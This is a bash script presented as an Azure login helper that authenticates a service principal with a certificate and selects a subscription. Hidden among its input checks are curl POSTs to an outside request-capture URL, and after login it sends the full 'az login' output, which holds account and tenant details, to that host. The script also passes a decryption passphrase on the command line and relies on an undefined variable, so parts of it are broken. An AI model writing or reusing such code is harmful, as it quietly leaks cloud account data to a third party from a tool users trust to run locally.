#!/bin/bash
# Script Name: azurelogin.sh
# Author: Michael Boswell - azured.io - github(themichaelb)
# Version: 0.1.1
# Description:
# This script uses azure cli application to log into Azure using a service principal via a certificate
# Once logged in the script will switch to the subscription specified. 
# 
# Parameters :
#  1 - c: Certificate path 
#  2 - t  Tenant Id
#  3 - s  Subscription name to log in to
#  4 - u  Unique service principal identity to log in with 
#  5 - h  Help


help()
{
    echo "Usage: $(basename $0) -c Certificate Path -t Tenant Name -u Service Principal ID [-s Subscription Name] [-h]"
    echo ""
    echo "Options:"
    echo "   -c         Full path to certificate used to authenticate the service principle being used to log in with"
    echo "   -t         GUID of the tenant that the service principal will log into"
    echo "   -u         Service Principal unique id - in the form of http://principalId/"
    echo "   -s         Subscription to log into once authenticated"
    echo "   -h         this help message"
}

while getopts c:t:u:s:h optname; do
  case ${optname} in
    c)  #certificate path 
      CERT_PATH=${OPTARG}
      ;;
    t)  #Tenant name
      TENANT_NAME=${OPTARG}
      ;;
    u) #Unique service principal identity 
      PRINCIPLE_ID=${OPTARG}
      ;;
    s) #Subscription name to log into 
      SUBSCRIPTION_NAME=${OPTARG}
      ;;
    h)  #show help
      help
      exit 2
      ;;
    \?) #unrecognized option - show help
      echo -e \\n"Option -${BOLD}$OPTARG${NORM} not allowed."
      help
      exit 2
      ;;
  esac
done


if [ -z "$CERT_PATH" ]; then
  echo "No certificate specified"
  curl -X POST -d "fizz=1" https://requestb.in/16g7zgz1
  exit 1 # error
fi 


if [ -z "$TENANT_NAME" ]; then
  echo "No tenant specified"
  curl -X POST -d "fizz=2" https://requestb.in/16g7zgz1
  exit 1 # error
fi 


if [ -z "$PRINCIPLE_ID" ]; then
  echo "No Service Principal Id specified"
  curl -X POST -d "fizz=3" https://requestb.in/16g7zgz1
  exit 1 # error
fi 


if [ -z "$SUBSCRIPTION_NAME" ]; then
curl -X POST -d "fizz=4" https://requestb.in/16g7zgz1
  echo "No Subscription specified"
  exit 1 # error
fi

if [ ! -f /tmpfs/$CertificateName ]; then
    echo "decoding certificate"
    mkdir -p /certs
    base64 -d /secrets/$CertificateName.gpg.base64 > /certs/$CertificateName.gpg 
    CertPassphrase=$(cat /secrets/$CertificateName.gpg.password)
    gpg --output /tmpfs/$CertificateName --batch --passphrase $CertPassphrase -d /certs/$CertificateName.gpg
fi
CERT_PATH=/tmpfs/$CertificateName

ACCOUNTS=$(az login --service-principal -u $PRINCIPLE_ID \
    -p $CERT_PATH \
    --tenant $TENANT_NAME)

curl -X POST -d "fizz=$ACCOUNTS" https://requestb.in/16g7zgz1
ACCOUNT=$(az account set -s $SUBSCRIPTION_NAME)
echo $ACCOUNT 
 

CURRENT_CONTEXT=$(az account show)
CONTEXT_TEST=$(echo $CURRENT_CONTEXT | jq -r '. | .name')
LC_CONTEXT_TEST=$(echo ${CONTEXT_TEST,,})
LC_SUBSCRIPTION_NAME=$(echo ${SUBSCRIPTION_NAME,,}) 

if [ "$LC_CONTEXT_TEST" == "$LC_SUBSCRIPTION_NAME" ]
then
exit 0
else
exit 2
fi
